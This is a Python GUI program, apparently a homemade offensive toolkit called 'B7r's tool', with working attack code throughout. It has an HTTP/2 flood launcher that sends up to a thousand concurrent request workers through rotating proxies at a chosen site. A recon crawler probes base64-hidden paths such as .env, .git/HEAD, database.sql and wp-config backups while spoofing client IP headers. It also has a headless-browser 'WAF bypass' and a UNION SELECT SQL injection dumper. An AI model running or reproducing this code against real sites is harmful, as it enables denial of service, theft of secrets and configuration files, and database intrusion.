# =====================================================================
# [ B7r's tool — ULTIMATE OMEGA SUITE v16.11 (CSV AUTO-EXPORT) ]
# Author: B7r Security Architecture
# Description: Modular GUI Suite with Dual-Tab Architecture, Live Telemetry Counters,
#              HTTP/2 Hyper-Stress DDoS, DOM Extractor, and CSV Auto-Export.
# =====================================================================

import asyncio
import threading
import aiohttp
import httpx
import os
import json
import csv
import base64
import random
import re
import sys
import time
from datetime import datetime
from urllib.parse import urlparse, urljoin

# استيراد واجهة المستخدم الرسومية
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, filedialog
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# استيراد محلل الهيكل العيكبي BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# استيراد محرك المتصفح الحقيقي لتخطي الحمايات العميقة
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# --- CONFIGURATION & ENCRYPTED DEEP VECTORS ---
TOOL_INFO = {
    "name": "B7r's tool",
    "version": "16.11-ULTIMATE-CSV",
    "codename": "PHANTOM-CSV-EXPORTER",
    "author": "B7r"
}

ENCRYPTED_DEEP_VECTORS = [
    "cm9ib3RzLnR4dA==",          # robots.txt
    "c2l0ZW1hcC54bWw=",          # sitemap.xml
    "LmVudg==",                  # .env
    "LmdpdC9IRUFE",              # .git/HEAD
    "Y29uZmlnLmpzb24=",          # config.json
    "ZGF0YWJhc2Uuc3Fs",          # database.sql
    "YmFja3VwLnppcA==",          # backup.zip
    "d3AtY29uZmlnLnBocC5iYWs=",  # wp-config.php.bak
    "cGFja2FnZS5qc29u",          # package.json
    "Y29tcG9zZXIuanNvbg==",      # composer.json
    "Lmh0dGFjY2Vzcw==",         # .htaccess
    "cGhwaW5mb3AucGhw",          # phpinfo.php
    "YXNzZXRzL2pzL21haW4uanM=",  # assets/js/main.js
    "YXNzZXRzL2Nzcy9zdHlsZS5jc3M=", # assets/css/style.css
    "c3RhdGljL2pzL2FwcC5qcw==",    # static/js/app.js
    "c3RhdGljL2Nzcy9tYWluLmNzcw==", # static/css/main.css
    "d3AtYWRtaW4=",              # wp-admin
    "bG9naW4=",                  # login
    "YXBpL3VzZXJz",              # api/users
    "YXBpL3YxL3N0YXR1cw=="       # api/v1/status
]

def decode_v(encoded):
    try:
        return base64.b64decode(encoded.encode('utf-8')).decode('utf-8')
    except:
        return ""


# =====================================================================
# SECURE STORAGE & ADVANCED MANAGERS
# =====================================================================
class UltimateSecurityCore:
    def __init__(self):
        self.base_dir = r"C:/Users/mohamed/Desktop/src"
        self._init_storage()
        self.agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 17_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/20.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
        ]

    def _init_storage(self):
        if not os.path.exists(self.base_dir):
            try:
                os.makedirs(self.base_dir, exist_ok=True)
            except:
                pass

    def get_target_dir(self, target_url):
        try:
            parsed = urlparse(target_url)
            domain = parsed.netloc if parsed.netloc else target_url.replace("https://", "").replace("http://", "").split("/")[0]
            safe_domain = "".join(c for c in domain if c.isalnum() or c in ('_', '-', '.'))
            if not safe_domain:
                safe_domain = "target_node"
            sub_dir = os.path.join(self.base_dir, safe_domain)
            if not os.path.exists(sub_dir):
                os.makedirs(sub_dir, exist_ok=True)
            return sub_dir
        except:
            return self.base_dir

    def get_stealth_headers(self, target_url):
        ip = f"{random.randint(1, 235)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        parsed = urlparse(target_url)
        return {
            "Host": parsed.netloc,
            "User-Agent": random.choice(self.agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,
            "CF-Connecting-IP": ip,
            "Referer": target_url,
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="138"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "keep-alive"
        }

    def load_proxy_pool(self, file_path="active_proxies.txt"):
        path_to_load = file_path if os.path.exists(file_path) else "proxies.txt"
        proxies = []
        if os.path.exists(path_to_load):
            with open(path_to_load, "r", encoding="utf-8") as f:
                for line in f:
                    p = line.strip()
                    if p and not p.startswith("#"):
                        proxies.append(p)
        return proxies


# =====================================================================
# GUI INTERFACE DESIGN (B7r's tool)
# =====================================================================
class UltimateB7rGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("B7r's tool — Ultimate Omega Suite v16.11 (CSV Exporter)")
        self.root.geometry("1200x850")
        self.root.configure(bg="#07090e")

        self.core = UltimateSecurityCore()
        self.logs = []
        self.operation_active = False
        self.ddos_active = False

        self.recon_files_count = 0
        self.recon_requests_count = 0
        self.ddos_hits_count = 0
        self.ddos_success_count = 0

        self._build_interface()

    def _build_interface(self):
        header = tk.Frame(self.root, bg="#0f172a", bd=2, relief=tk.GROOVE)
        header.pack(pady=6, padx=15, fill=tk.X)

        tk.Label(header, text="[ B7r's tool — CSV AUTO-EXPORT & TELEMETRY SUITE ]", fg="#38bdf8", bg="#0f172a", font=("Consolas", 15, "bold")).pack(pady=4)
        
        status_text = []
        status_text.append("Playwright: On" if PLAYWRIGHT_AVAILABLE else "Playwright: Off")
        status_text.append("HTTP/2 Engine: Online")
        status_text.append("CSV Exporter: Armed")
        tk.Label(header, text=" | ".join(status_text), fg="#34d399", bg="#0f172a", font=("Consolas", 9)).pack(pady=2)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(pady=5, padx=15, fill=tk.BOTH, expand=True)

        self.tab_recon = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_recon, text=" 🔍 Recon & Bypass Center ")
        self._build_recon_tab(self.tab_recon)

        self.tab_ddos = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_ddos, text=" ⚡️ Hyper-Stress DDoS Center ")
        self._build_ddos_tab(self.tab_ddos)

        console_box_fr = tk.LabelFrame(self.root, text=" Global Execution Output Stream ", fg="#38bdf8", bg="#07090e", font=("Consolas", 10, "bold"), bd=2, relief=tk.GROOVE)
        console_box_fr.pack(pady=5, padx=15, fill=tk.BOTH, expand=True)

        self.console = scrolledtext.ScrolledText(console_box_fr, wrap=tk.WORD, bg="#020617", fg="#34d399", font=("Consolas", 9), state=tk.DISABLED, insertbackground="white")
        self.console.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        ft = tk.Frame(self.root, bg="#07090e")
        ft.pack(pady=8, padx=15, fill=tk.X)

        tk.Button(ft, text="Export Master Report (JSON)", command=self.export_report, font=("Consolas", 9, "bold"), bg="#047857", fg="#ffffff").pack(side=tk.LEFT, padx=5, ipady=4)
        tk.Button(ft, text="Export Telemetry Report (CSV)", command=self.export_csv_report, font=("Consolas", 9, "bold"), bg="#1d4ed8", fg="#ffffff").pack(side=tk.LEFT, padx=5, ipady=4)
        tk.Button(ft, text="Stop All Operations", command=self.stop_all_operations, font=("Consolas", 9, "bold"), bg="#991b1b", fg="#ffffff").pack(side=tk.LEFT, padx=5, ipady=4)
        tk.Button(ft, text="Clear Console", command=self.clear_console, font=("Consolas", 9), bg="#334155", fg="#ffffff").pack(side=tk.LEFT, padx=5, ipady=4)

    def _build_recon_tab(self, parent):
        cfg_frame = tk.LabelFrame(parent, text=" Target & Recon Parameters ", fg="#38bdf8", bg="#07090e", font=("Consolas", 10, "bold"), bd=2, relief=tk.GROOVE)
        cfg_frame.pack(pady=10, padx=10, fill=tk.X)

        r1 = tk.Frame(cfg_frame, bg="#07090e")
        r1.pack(pady=8, fill=tk.X, padx=10)

        tk.Label(r1, text="Target URL:", fg="#f8fafc", bg="#07090e", font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.recon_target_box = tk.Entry(r1, width=35, font=("Consolas", 10), bg="#1e293b", fg="#38bdf8", insertbackground="white", bd=1)
        self.recon_target_box.pack(side=tk.LEFT, padx=5)

        tk.Label(r1, text="Max Depth:", fg="#f8fafc", bg="#07090e", font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.recon_depth_box = tk.Entry(r1, width=5, font=("Consolas", 10), bg="#1e293b", fg="#38bdf8", insertbackground="white", bd=1)
        self.recon_depth_box.insert(0, "4")
        self.recon_depth_box.pack(side=tk.LEFT, padx=5)

        tk.Label(r1, text="Endpoint:", fg="#f8fafc", bg="#07090e", font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.recon_param_box = tk.Entry(r1, width=12, font=("Consolas", 10), bg="#1e293b", fg="#38bdf8", insertbackground="white", bd=1)
        self.recon_param_box.pack(side=tk.LEFT, padx=5)

        metrics_fr = tk.LabelFrame(parent, text=" Live Recon Telemetry ", fg="#34d399", bg="#07090e", font=("Consolas", 9, "bold"), bd=1, relief=tk.GROOVE)
        metrics_fr.pack(pady=5, padx=10, fill=tk.X)

        m_inner = tk.Frame(metrics_fr, bg="#07090e")
        m_inner.pack(pady=5, fill=tk.X, padx=10)

        self.recon_files_var = tk.StringVar(value="0")
        self.recon_req_var = tk.StringVar(value="0")

        tk.Label(m_inner, text="Files Secured:", fg="#94a3b8", bg="#07090e", font=("Consolas", 9)).pack(side=tk.LEFT, padx=5)
        tk.Label(m_inner, textvariable=self.recon_files_var, fg="#34d399", bg="#07090e", font=("Consolas", 10, "bold")).pack(side=tk.LEFT, padx=5)

        tk.Label(m_inner, text=" | Requests Executed:", fg="#94a3b8", bg="#07090e", font=("Consolas", 9)).pack(side=tk.LEFT, padx=5)
        tk.Label(m_inner, textvariable=self.recon_req_var, fg="#38bdf8", bg="#07090e", font=("Consolas", 10, "bold")).pack(side=tk.LEFT, padx=5)

        btns = tk.Frame(parent, bg="#07090e")
        btns.pack(pady=8, padx=10, fill=tk.X)

        b_style = {"font": ("Consolas", 9, "bold"), "bg": "#1e293b", "fg": "#38bdf8", "activebackground": "#38bdf8", "activeforeground": "#07090e", "relief": tk.RAISED, "bd": 2}

        tk.Button(btns, text="1. DOM Deep Scan", command=lambda: self.run_recon_task(1), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)
        tk.Button(btns, text="2. Playwright WAF Bypass", command=lambda: self.run_recon_task(2), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)
        tk.Button(btns, text="3. Advanced SQLi Check", command=lambda: self.run_recon_task(3), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)
        tk.Button(btns, text="4. Secure JSON Dumper", command=lambda: self.run_recon_task(4), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)
        tk.Button(btns, text="5. Check Proxies", command=lambda: self.run_recon_task(5), font=("Consolas", 9, "bold"), bg="#065f46", fg="#a7f3d0", relief=tk.RAISED, bd=2).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)

    def _build_ddos_tab(self, parent):
        cfg_frame = tk.LabelFrame(parent, text=" Hyper-Stress DDoS Configuration ", fg="#fca5a5", bg="#07090e", font=("Consolas", 10, "bold"), bd=2, relief=tk.GROOVE)
        cfg_frame.pack(pady=10, padx=10, fill=tk.X)

        r1 = tk.Frame(cfg_frame, bg="#07090e")
        r1.pack(pady=8, fill=tk.X, padx=10)

        tk.Label(r1, text="DDoS Target URL:", fg="#f8fafc", bg="#07090e", font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.ddos_target_box = tk.Entry(r1, width=38, font=("Consolas", 10), bg="#1e293b", fg="#fca5a5", insertbackground="white", bd=1)
        self.ddos_target_box.pack(side=tk.LEFT, padx=5)

        tk.Label(r1, text="HTTP/2 Streams:", fg="#f8fafc", bg="#07090e", font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.ddos_streams_box = tk.Entry(r1, width=8, font=("Consolas", 10), bg="#1e293b", fg="#fca5a5", insertbackground="white", bd=1)
        self.ddos_streams_box.insert(0, "1000")
        self.ddos_streams_box.pack(side=tk.LEFT, padx=5)

        metrics_fr = tk.LabelFrame(parent, text=" Live DDoS Telemetry ", fg="#f87171", bg="#07090e", font=("Consolas", 9, "bold"), bd=1, relief=tk.GROOVE)
        metrics_fr.pack(pady=5, padx=10, fill=tk.X)

        m_inner = tk.Frame(metrics_fr, bg="#07090e")
        m_inner.pack(pady=5, fill=tk.X, padx=10)

        self.ddos_hits_var = tk.StringVar(value="0")
        self.ddos_success_var = tk.StringVar(value="0")

        tk.Label(m_inner, text="Total Hits Sent:", fg="#94a3b8", bg="#07090e", font=("Consolas", 9)).pack(side=tk.LEFT, padx=5)
        tk.Label(m_inner, textvariable=self.ddos_hits_var, fg="#fca5a5", bg="#07090e", font=("Consolas", 10, "bold")).pack(side=tk.LEFT, padx=5)

        tk.Label(m_inner, text=" | Success (HTTP 200):", fg="#94a3b8", bg="#07090e", font=("Consolas", 9)).pack(side=tk.LEFT, padx=5)
        tk.Label(m_inner, textvariable=self.ddos_success_var, fg="#34d399", bg="#07090e", font=("Consolas", 10, "bold")).pack(side=tk.LEFT, padx=5)

        btns = tk.Frame(parent, bg="#07090e")
        btns.pack(pady=10, padx=10, fill=tk.X)

        tk.Button(btns, text="🚀 LAUNCH HTTP/2 HYPER-STRESS ASSAULT", command=self.start_ddos_attack, font=("Consolas", 11, "bold"), bg="#7f1d1d", fg="#ffffff", activebackground="#ef4444", activeforeground="#ffffff", relief=tk.RAISED, bd=3).pack(side=tk.LEFT, expand=True, padx=5, ipady=8, fill=tk.X)
        tk.Button(btns, text="🛑 HALT ASSAULT", command=self.stop_ddos_attack, font=("Consolas", 11, "bold"), bg="#334155", fg="#fca5a5", activebackground="#ef4444", activeforeground="#ffffff", relief=tk.RAISED, bd=3).pack(side=tk.LEFT, expand=True, padx=5, ipady=8, fill=tk.X)

    def write_console(self, text):
        self.console.config(state=tk.NORMAL)
        self.console.insert(tk.END, text + "\n")
        self.console.see(tk.END)
        self.console.config(state=tk.DISABLED)

    def clear_console(self):
        self.console.config(state=tk.NORMAL)
        self.console.delete(1.0, tk.END)
        self.console.config(state=tk.DISABLED)

    def stop_all_operations(self):
        self.operation_active = False
        self.ddos_active = False
        self.write_console("[!] Global termination signal sent. All background workers halted.")

    def stop_ddos_attack(self):
        self.ddos_active = False
        self.write_console("[!] DDoS termination signal sent.")

    def run_recon_task(self, mode):
        target = self.recon_target_box.get().strip()
        if mode != 5 and not target:
            messagebox.showerror("Error", "Target URL is mandatory!")
            return
        if target and not target.startswith("http"):
            target = "https://" + target
        param = self.recon_param_box.get().strip()
        try:
            val = int(self.recon_depth_box.get().strip())
        except:
            val = 4

        self.recon_files_count = 0
        self.recon_requests_count = 0
        self.recon_files_var.set("0")
        self.recon_req_var.set("0")

        self.operation_active = True
        threading.Thread(target=lambda: asyncio.run(self.execute_recon_backend(mode, target, param, val)), daemon=True).start()

    def start_ddos_attack(self):
        target = self.ddos_target_box.get().strip()
        if not target:
            messagebox.showerror("Error", "DDoS Target URL is mandatory!")
            return
        if not target.startswith("http"):
            target = "https://" + target
        try:
            streams = int(self.ddos_streams_box.get().strip())
        except:
            streams = 1000

        self.ddos_hits_count = 0
        self.ddos_success_count = 0
        self.ddos_hits_var.set("0")
        self.ddos_success_var.set("0")

        self.ddos_active = True
        threading.Thread(target=lambda: asyncio.run(self.execute_ddos_backend(target, streams)), daemon=True).start()

    async def execute_recon_backend(self, mode, target, param, val):
        target_dir = self.core.get_target_dir(target) if target else self.core.base_dir
        self.write_console(f"\n[⚡️] Recon Engine Engaged [Mode {mode}]")

        if mode == 5:
            self.write_console("[*] Starting Asynchronous Proxy Health Check...")
            input_file = "proxies.txt"
            output_file = "active_proxies.txt"
            if not os.path.exists(input_file):
                with open(input_file, "w") as f:
                    f.write("http://127.0.0.1:8080\n")
            
            with open(input_file, "r", encoding="utf-8") as f:
                proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]

            sem = asyncio.Semaphore(150)
            active_proxies = []

            async def test_proxy(p_url):
                async with sem:
                    try:
                        self.recon_requests_count += 1
                        self.recon_req_var.set(str(self.recon_requests_count))
                        start_t = time.time()
                        async with httpx.AsyncClient(proxy=p_url, timeout=3.0, verify=False, http2=True) as client:
                            resp = await client.get("https://httpbin.org/ip")
                            lat = time.time() - start_t
                            if resp.status_code == 200:
                                self.write_console(f"    [+] VALID PROXY: {p_url} ({lat:.2f}s)")
                                active_proxies.append(p_url)
                    except:
                        pass

            tasks = [test_proxy(p) for p in proxies]
            await asyncio.gather(*tasks)

            with open(output_file, "w", encoding="utf-8") as f:
                for p in active_proxies:
                    f.write(p + "\n")
            self.write_console(f"[*] Proxy Check Finished! {len(active_proxies)} active proxies secured.")
            return

        if mode == 2 and PLAYWRIGHT_AVAILABLE:
            self.write_console("[🛡] Launching Playwright Stealth Browser...")
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled", "--no-sandbox"])
                context = await browser.new_context(user_agent=random.choice(self.core.agents), viewport={"width": 1920, "height": 1080})
                page = await context.new_page()
                try:
                    await page.goto(target, timeout=40000, wait_until="networkidle")
                    await page.mouse.move(250, 250)
                    await page.wait_for_timeout(5000)
                    content = await page.content()
                    self.write_console(f"[🔥] BYPASS SUCCESSFUL! Content length: {len(content)}")
                    save_path = os.path.join(target_dir, "playwright_bypassed_target.html")
                    with open(save_path, "w", encoding="utf-8") as f:
                        f.write(content)
                    self.recon_files_count += 1
                    self.recon_files_var.set(str(self.recon_files_count))
                    self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": "Playwright Bypass", "target": target, "status": "SUCCESS"})
                    await browser.close()
                except Exception as e:
                    self.write_console(f"[!] Playwright error: {e}")
                    await browser.close()
            # التصدير التلقائي بصيغة CSV بعد العملية
            self.export_csv_report()
            return

        max_depth = val
        connector = aiohttp.TCPConnector(limit=500, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            if mode == 1 or mode == 3:
                visited_urls = set()
                queue = asyncio.Queue()

                base_vectors = [decode_v(v) for v in ENCRYPTED_DEEP_VECTORS]
                if param:
                    base_vectors.append(param.lstrip('/'))

                for v in base_vectors:
                    full_url = urljoin(target.rstrip('/') + '/', v.lstrip('/'))
                    await queue.put((full_url, 1))

                await queue.put((target, 1))
                binary_extensions = ['.zip', '.tar', '.gz', '.png', '.jpg', '.jpeg', '.gif', '.pdf', '.exe', '.ico', '.woff', '.woff2', '.mp4', '.mp3', '.ttf', '.eot']

                async def worker():
                    while not queue.empty() and self.operation_active:
                        try:
                            current_url, current_depth = await queue.get()
                            if current_url in visited_urls or current_depth > max_depth:
                                queue.task_done()
                                continue

                            visited_urls.add(current_url)
                            headers = self.core.get_stealth_headers(target)
                            
                            self.recon_requests_count += 1
                            self.recon_req_var.set(str(self.recon_requests_count))

                            async with session.get(current_url, headers=headers, timeout=8) as resp:
                                parsed_url = urlparse(current_url)
                                path_part = parsed_url.path.strip('/')
                                if not path_part:
                                    path_part = "index_root.html"

                                filename_part = path_part.split('/')[-1]
                                _, ext = os.path.splitext(filename_part)

                                if not ext:
                                    ct = resp.headers.get("Content-Type", "").lower()
                                    if "javascript" in ct: ext = ".js"
                                    elif "css" in ct: ext = ".css"
                                    elif "json" in ct: ext = ".json"
                                    elif "xml" in ct: ext = ".xml"
                                    elif "html" in ct: ext = ".html"
                                    else: ext = ".txt"
                                    safe_filename = path_part.replace('/', '_').replace('.', '_') + ext
                                else:
                                    safe_filename = path_part.replace('/', '_')

                                full_file_path = os.path.join(target_dir, safe_filename)
                                is_binary = ext.lower() in binary_extensions

                                if resp.status == 200:
                                    if is_binary:
                                        content_bytes = await resp.read()
                                        if len(content_bytes) > 0:
                                            with open(full_file_path, "wb") as bf:
                                                bf.write(content_bytes)
                                            self.recon_files_count += 1
                                            self.recon_files_var.set(str(self.recon_files_count))
                                            self.write_console(f"    [🔥] BINARY ASSET: {path_part} --> {safe_filename}")
                                            self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": f"Binary Asset ({ext})", "target": current_url, "status": "SUCCESS"})
                                    else:
                                        body = await resp.text(errors='ignore')
                                        if len(body) > 5 and "404 Not Found" not in body and "Access Denied" not in body:
                                            with open(full_file_path, "w", encoding="utf-8", errors="ignore") as tf:
                                                tf.write(body)
                                            self.recon_files_count += 1
                                            self.recon_files_var.set(str(self.recon_files_count))
                                            self.write_console(f"    [🔥] DEEP FILE SECURED: {path_part} --> {safe_filename}")
                                            self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": f"DOM Extractor ({ext})", "target": current_url, "status": "SUCCESS"})

                                            if current_depth < max_depth:
                                                discovered_links = set()
                                                if BS4_AVAILABLE and (ext in ['.html', '.htm', '.php', '.asp', '.txt'] or not ext):
                                                    try:
                                                        soup = BeautifulSoup(body, 'html.parser')
                                                        for tag in soup.find_all(['script', 'link', 'a', 'img', 'iframe', 'source', 'form']):
                                                            for attr in ['src', 'href', 'action', 'data-url']:
                                                                val = tag.get(attr)
                                                                if val:
                                                                    discovered_links.add(val)
                                                    except:
                                                        pass

                                                regex_links = re.findall(r'["\'](/?[a-zA-Z0-9_\-/\\.]+\.(?:js|css|json|xml|php|html|txt|png|jpg|pdf|zip))["\']', body, re.IGNORECASE)
                                                for rl in regex_links:
                                                    discovered_links.add(rl)

                                                for link in discovered_links:
                                                    absolute_link = urljoin(current_url, link)
                                                    if urlparse(absolute_link).netloc == urlparse(target).netloc:
                                                        if absolute_link not in visited_urls:
                                                            await queue.put((absolute_link, current_depth + 1))
                        except:
                            pass
                        finally:
                            queue.task_done()

                workers = [asyncio.create_task(worker()) for _ in range(25)]
                await queue.join()
                for w in workers:
                    w.cancel()
                self.write_console("[*] DOM Deep Extraction sequence finished.")
                # التصدير التلقائي بصيغة CSV بعد اكتمال الزحف
                self.export_csv_report()

            elif mode == 4:
                self.write_console("[*] Executing Secure JSON Schema Dumper...")
                endpoint = param if param else f"{target}/index.php?id=1"
                dump_url = endpoint + "' UNION SELECT 1, version(), database()-- -"
                headers = self.core.get_stealth_headers(target)
                try:
                    async with session.get(dump_url, headers=headers, timeout=6) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            j_path = os.path.join(target_dir, "ultimate_database_dump.json")
                            with open(j_path, "w", encoding="utf-8") as jf:
                                json.dump({"target": dump_url, "data": content}, jf, indent=4, ensure_ascii=False)
                            self.recon_files_count += 1
                            self.recon_files_var.set(str(self.recon_files_count))
                            self.write_console(f"    [🔥] JSON Schema Dump secured: {j_path}")
                            self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": "JSON Dumper", "target": dump_url, "status": "SUCCESS"})
                            self.export_csv_report()
                except Exception as e:
                    self.write_console(f"[!] Dumper error: {e}")

    async def execute_ddos_backend(self, target, stream_count):
        self.write_console(f"\n[🔥] LAUNCHING HTTP/2 HYPER-STRESS SWARM ON TARGET: {target} ({stream_count} Streams)")
        proxy_list = self.core.load_proxy_pool("active_proxies.txt")
        if proxy_list:
            self.write_console(f"[*] Loaded {len(proxy_list)} active proxies for dynamic rotation.")
        else:
            self.write_console("[*] No proxies found in active_proxies.txt. Running direct high-speed assault.")

        async def stress_worker(worker_id):
            while self.ddos_active:
                sel_proxy = random.choice(proxy_list) if proxy_list else None
                client_kwargs = {"http2": True, "verify": False, "limits": httpx.Limits(max_connections=300)}
                if sel_proxy:
                    client_kwargs["proxy"] = sel_proxy
                try:
                    async with httpx.AsyncClient(**client_kwargs, timeout=4.0) as client:
                        headers = self.core.get_stealth_headers(target)
                        
                        self.ddos_hits_count += 1
                        self.ddos_hits_var.set(str(self.ddos_hits_count))

                        resp = await client.get(target, headers=headers)
                        
                        if resp.status_code == 200:
                            self.ddos_success_count += 1
                            self.ddos_success_var.set(str(self.ddos_success_count))

                        p_tag = f"via [{sel_proxy}]" if sel_proxy else "[Direct]"
                        self.write_console(f"    [->] H2 Worker #{worker_id} {p_tag} --> Status: {resp.status_code}")
                except:
                    await asyncio.sleep(0.05)
                await asyncio.sleep(0.01)

        workers = [asyncio.create_task(stress_worker(i)) for i in range(stream_count)]
        while self.ddos_active:
            await asyncio.sleep(1)
        for w in workers:
            w.cancel()
        self.write_console("[*] HTTP/2 Stress assault successfully halted.")
        # تسجيل الختام وتصدير تقرير الـ CSV للعمليات الهجومية
        self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": "HTTP2 Hyper-Stress Assault", "target": target, "status": f"Total Hits: {self.ddos_hits_count}, Success: {self.ddos_success_count}"})
        self.export_csv_report()

    def export_report(self):
        if not self.logs:
            messagebox.showwarning("Warning", "No logs to export.")
            return
        rep_path = os.path.join(self.core.base_dir, "b7r_ultimate_master_report.json")
        try:
            with open(rep_path, "w", encoding="utf-8") as f:
                json.dump(self.logs, f, indent=4, ensure_ascii=False)
            messagebox.showinfo("Success", f"Master Report exported to:\n{rep_path}")
            self.write_console(f"[*] Report successfully written: {rep_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export: {e}")

    def export_csv_report(self):
        """تصدير التقارير وسجلات العمليات تلقائياً بصيغة CSV"""
        if not self.logs:
            return
        csv_path = os.path.join(self.core.base_dir, "b7r_telemetry_report.csv")
        try:
            fieldnames = ["timestamp", "action", "target", "status"]
            with open(csv_path, "w", newline="", encoding="utf-8-sig") as csvfile:
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                for log in self.logs:
                    writer.writerow(log)
            self.write_console(f"[*] CSV Telemetry Report successfully exported: {csv_path}")
        except Exception as e:
            self.write_console(f"[!] CSV Export error: {e}")


def main():
    if not TKINTER_AVAILABLE:
        print("[!] Tkinter is missing.")
        sys.exit(1)
    root = tk.Tk()
    app = UltimateB7rGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
